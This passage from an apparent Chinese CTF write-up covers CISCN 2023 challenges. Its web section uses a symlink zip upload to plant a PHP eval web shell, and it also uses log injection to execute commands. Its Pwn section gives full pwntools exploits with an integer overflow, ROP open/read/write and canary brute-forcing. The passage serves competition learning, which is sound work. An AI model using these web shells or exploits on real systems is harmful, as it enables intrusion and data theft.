number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">]</span>yy <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">29</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">24</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">29</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">21</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">24</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">29</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">21</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">28</span><span class="token punctuation">,</span><span class="token number">29</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">21</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">29</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">24</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">29</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">29</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">,</span><span class="token number">21</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">24</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">,</span><span class="token number">31</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">24</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">24</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">24</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">24</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">24</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">24</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">21</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">24</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">24</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">24</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">]</span><span class="token comment">#用for循环将文件中的值赋值给x，y</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>df<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    x<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>df<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">','</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    y<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>df<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">','</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>xx<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    x<span class="token punctuation">.</span>append<span class="token punctuation">(</span>xx<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>    y<span class="token punctuation">.</span>append<span class="token punctuation">(</span>yy<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment">#画图</span>plt<span class="token punctuation">.</span>scatter<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">,</span> c<span class="token operator">=</span>color<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> edgecolors<span class="token operator">=</span><span class="token string">'r'</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="https://shierjinghuang.github.io/2023/05/27/2023%E5%B9%B4ciscn%E9%A2%98%E8%A7%A3/Ciscn%20%E6%95%A3%E7%82%B9%E5%9B%BE.png" style="zoom:67%;" /><blockquote><p> flag{202305012359}</p></blockquote><h4 id="被加密的生产流量"><a href="#被加密的生产流量" class="headerlink" title="被加密的生产流量:"></a>被加密的生产流量:</h4><p>追踪流发现base编码</p><img src="https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/20230527141401.png" style="zoom: 33%;" /><p>base32编码，解码得到flag</p><blockquote><p>flag{c1f_fi1g_1000}</p></blockquote><h4 id="pyshell"><a href="#pyshell" class="headerlink" title="pyshell:"></a>pyshell:</h4><p>本题为python的shell终端，拼接读取flag的字符串后用eval()进行执行，即可获得flag</p><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230528145149.png" style="zoom: 67%;" /><blockquote><p>flag{2c9b76d6-8379-4dd8-a95a-a383420575f5}</p></blockquote><h3 id="web"><a href="#web" class="headerlink" title="web"></a>web</h3><h4 id="unzip："><a href="#unzip：" class="headerlink" title="unzip："></a>unzip：</h4><p>建立软连接实现，</p><p>参考博客：<code>https://forum.butian.net/share/906</code></p><p>先建立软连接</p><pre class="line-numbers language-none"><code class="language-none">ln -s &#x2F;var&#x2F;www&#x2F;html test<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">zip --symlinks test.zip .&#x2F;*<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>创建 test文件</p><pre class="line-numbers language-none"><code class="language-none">mkdir test<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>cd 进去创建cmd.php</p><pre class="line-numbers language-none"><code class="language-none">vim cmd.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>往里面写入一句话木马</p><pre class="line-numbers language-none"><code class="language-none">&lt;?php @eval($_POST[&#39;shell&#39;]);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>退回上级目录，压缩test文件夹</p><pre class="line-numbers language-none"><code class="language-none">zip -r test1.zip .&#x2F;*<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>先上传test.zip 后上传test1.zip，然后直接蚁剑连上</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;eci-2ze4nvw7kl74qmeixz3h.cloudeci1.ichunqiu.com&#x2F;cmd.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>找到flag即可</p><h4 id="dumpit"><a href="#dumpit" class="headerlink" title="dumpit"></a>dumpit</h4><p>对/flag下所有提供的参数进行测试，发现提供的第二个参数可以到日志</p><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230528145934.png" style="zoom:50%;" /><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230528150053.png" style="zoom:50%;" /><p>过滤了post和get，不能直接将木马写入参数中执行</p><p>这里采用echo重定向的方式，将待执行的命令写入到User-Agent中，并重定向到/app/log/a.php中</p><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230528150351.png" style="zoom:50%;" /><p>访问/log/a.php发现可以成功执行</p><p>最后在env环境变量中找到flag</p><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230528150515.png" style="zoom: 50%;" /><blockquote><p>flag{290a8dfa-4d33-4ae2-a781-ef17e464d0bc}</p></blockquote><h3 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h3><h4 id="Sign-in-passwd"><a href="#Sign-in-passwd" class="headerlink" title="Sign_in_passwd:"></a>Sign_in_passwd:</h4><p>是一道Base64换表题目，使用CyberChef的Base64转码功能，可以自定义Base64表格，输入需要转码的字符串，即可得flag ，题目给的表中有部分经过url编码，解码后便可以正常实现</p><h4 id="基于国密SM2算法的密钥密文分发"><a href="#基于国密SM2算法的密钥密文分发" class="headerlink" title="基于国密SM2算法的密钥密文分发:"></a>基于国密SM2算法的密钥密文分发:</h4><p>非预期解，在登录获取id并且发送完公钥后，通过quantum获取服务器端密钥的密文后，search查看发现服务器端存在密钥的明文，即quantumStringServer，发送该明文进行check获取flag。</p><p>​                                <a href="https://imgse.com/i/p9LeEZj"><img src="https://s1.ax1x.com/2023/05/27/p9LeEZj.png" alt="p9LeEZj.png" style="zoom: 50%;" />        </a>    </p><blockquote><p>flag{fe362b36-56e5-4b6c-a5cc-12d3e755ce0}</p></blockquote><h4 id="可信度量"><a href="#可信度量" class="headerlink" title="可信度量:"></a>可信度量:</h4><p>非预期解，通过命令全局搜索flag字符串。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">grep <span class="token operator">-</span>ra <span class="token string">"flag&#123;"</span> <span class="token operator">/</span> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>![img](file:///C:\Users\86198\Documents\Tencent Files\1766871892\Image\C2C\OYUNA5G0`(OO)VX%3$@P947.png)</p><h3 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h3><h4 id="烧烤摊儿"><a href="#烧烤摊儿" class="headerlink" title="烧烤摊儿:"></a>烧烤摊儿:</h4><p>首先，分析vip函数，发现无符号整数存在整数溢出，因此考虑输入-1000000使余额溢出到大于100000。</p><p>![img](file:///C:\Users\86198\Documents\Tencent Files\1766871892\Image\C2C]I{EODH[FQ1S]6X$Y}L0N8Y.png)</p><p>之后买下该店后通过栈溢出劫持程序执行流，因为本题禁止了execve的系统调用，因此考虑orw读取flag。只需要控制栈溢出后分别执行open，read，write三个函数。</p><p>完整exp：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment">#io = process("./shaokao")</span>io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span>name_addr <span class="token operator">=</span> <span class="token number">0x4E60F0</span>open_addr <span class="token operator">=</span> <span class="token number">0x457C90</span>read_addr <span class="token operator">=</span> <span class="token number">0x457DC0</span>write_addr <span class="token operator">=</span> <span class="token number">0x457E60</span>pop_rdi_ret <span class="token operator">=</span> <span class="token number">0x40264f</span>pop_rsi_ret <span class="token operator">=</span> <span class="token number">0x40a67e</span>pop_rdx_rbx <span class="token operator">=</span> <span class="token number">0x4a404b</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span><span class="token comment">#integer overflow</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'-1000000'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'4'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'5'</span><span class="token punctuation">)</span><span class="token comment">#rop orw</span>payload <span class="token operator">=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>name_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rsi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>open_addr<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rsi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>name_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdx_rbx<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x200</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>read_addr<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rsi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>name_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdx_rbx<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x200</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>write_addr<span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b'./flag\x00\x00'</span> <span class="token operator">+</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x16</span> <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="funcanary："><a href="#funcanary：" class="headerlink" title="funcanary：()"></a>funcanary：()</h4><p>简单栈溢出，只不过在栈上放了canary，分析发现存在后门函数backdoor，同时main函数是while(1)循环，这就使得我们输入canary失败时仍然能回到main函数，因此可以通过爆破泄露出canary的内容(8位canary，爆破七次)。程序开启了pie，因此需要爆破后门函数的地址,发现后三位不变，爆破倒数第四位。</p><p>exp：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./funcanary'</span><span class="token punctuation">)</span><span class="token comment"># io = remote('', '')</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./pwn123'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'welcome\n'</span><span class="token punctuation">)</span>canary <span class="token operator">=</span> <span class="token string">b'\x00'</span><span class="token keyword">for</span> m <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        payload <span class="token operator">=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x68</span> <span class="token operator">+</span> canary <span class="token operator">+</span> p8<span class="token punctuation">(</span>i<span class="token punctuation">)</span>        io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>        msg <span class="token operator">=</span> io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'welcome\n'</span><span class="token punctuation">)</span>        <span class="token comment">#输入了正确的canary，返回</span>        <span class="token keyword">if</span> <span class="token string">b'have fun'</span> <span class="token keyword">in</span> msg<span class="token punctuation">:</span>            canary <span class="token operator">+=</span> p8<span class="token punctuation">(</span>i<span class="token punctuation">)</span>            <span class="token keyword">break</span>backdoor <span class="token operator">=</span> <span class="token number">0x1229</span><span class="token keyword">for</span> k <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    addr <span class="token operator">=</span> k <span class="token operator">*</span> <span class="token number">16</span> <span class="token operator">+</span> <span class="token number">2</span>    payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x68</span> <span class="token operator">+</span> canary <span class="token operator">+</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">8</span> <span class="token operator">+</span> <span class="token string">b'\x31'</span> <span class="token operator">+</span> p8<span class="token punctuation">(</span>addr<span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    msg <span class="token operator">=</span> io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">b'flag&#123;'</span> <span class="token keyword">in</span> msg<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>msg<span class="token punctuation">)</span>        io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" 